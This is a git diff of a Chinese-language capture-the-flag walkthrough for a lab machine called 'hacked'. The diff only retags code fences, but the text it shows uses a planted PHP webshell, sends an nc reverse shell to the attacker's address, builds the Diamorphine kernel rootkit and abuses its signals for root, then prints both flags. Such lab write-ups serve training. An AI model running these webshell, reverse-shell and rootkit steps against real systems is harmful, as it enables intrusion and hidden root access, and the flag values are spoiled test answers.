@@ -79,7 +79,7 @@ I modified this webshell to only execute my secret parameter.
 
 尝试利用
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ curl http://192.168.56.116/simple-backdoor.php?secret=whoami
 I modified this webshell to only execute my secret parameter.
@@ -88,7 +88,7 @@ www-data
 
 ## User - www-data
 
-```shell
+```bash
 # curl http://192.168.56.116/simple-backdoor.php?secret=nc+192.168.56.102+9999+-e+/bin/bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
@@ -104,7 +104,7 @@ www-data
 
 [m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)](https://github.com/m0nad/Diamorphine)
 
-```shell
+```bash
 (remote) www-data@hacked:/tmp/Diamorphine$ ls -lh
 total 32K
 -rw-r--r-- 1 www-data www-data 1.5K Feb 18 23:05 LICENSE.txt
@@ -119,7 +119,7 @@ total 32K
 
 由于靶机上的 gcc 编译环境有问题，其中 `cc1` 程序不存在于 `PATH` 环境变量中，所以需要进行一定的 patch
 
-```shell
+```bash
 (remote) www-data@hacked:/tmp/Diamorphine$ ln -s /usr/lib/gcc/x86_64-linux-gnu/8/cc1 /tmp/Diamorphine/cc1
 (remote) www-data@hacked:/tmp/Diamorphine$ export PATH=/tmp/Diamorphine:$PATH
 ```
@@ -128,7 +128,7 @@ total 32K
 
 然后开始编译
 
-```shell
+```bash
 (remote) www-data@hacked:/tmp/Diamorphine$ make
 make -C /lib/modules/4.19.0-12-amd64/build M=/tmp/Diamorphine modules
 make[1]: Entering directory '/usr/src/linux-headers-4.19.0-12-amd64'
@@ -148,7 +148,7 @@ make[1]: Leaving directory '/usr/src/linux-headers-4.19.0-12-amd64'
 
 靶机已经部署过 Diamorphine
 
-```shell
+```bash
 (remote) www-data@hacked:/tmp$ kill -63 0
 (remote) www-data@hacked:/tmp$ lsmod | grep diamorphine
 diamorphine            16384  0
@@ -156,7 +156,7 @@ diamorphine            16384  0
 
 ## User - root
 
-```shell
+```bash
 (remote) www-data@hacked:/tmp$ kill -64 0
 (remote) root@hacked:/tmp$ whoami
 root
@@ -164,14 +164,14 @@ root
 
 ### flag - user
 
-```shell
+```bash
 (remote) root@hacked:/home/h4x0r$ cat user.txt
 HMVimthabesthacker
 ```
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@hacked:/root$ cat root.txt
 HMVhackingthehacker
 ```
